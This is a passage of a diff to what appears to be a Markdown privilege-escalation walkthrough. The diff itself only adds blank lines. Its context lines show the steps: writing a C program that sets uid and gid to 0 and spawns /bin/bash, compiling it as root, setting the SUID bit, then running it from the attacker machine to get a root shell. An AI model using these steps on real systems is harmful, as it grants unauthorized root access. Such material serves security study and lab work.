@@ -658,10 +658,12 @@ In command prompt type:
 `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
 
 **Do this as root user**
+
 4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
 5. In command prompt type: `chmod +s /tmp/1/x`
 
 
 **In Attacker Machine**
+
 6. In command prompt type: `/tmp/x`
 7. In command prompt type: `id`
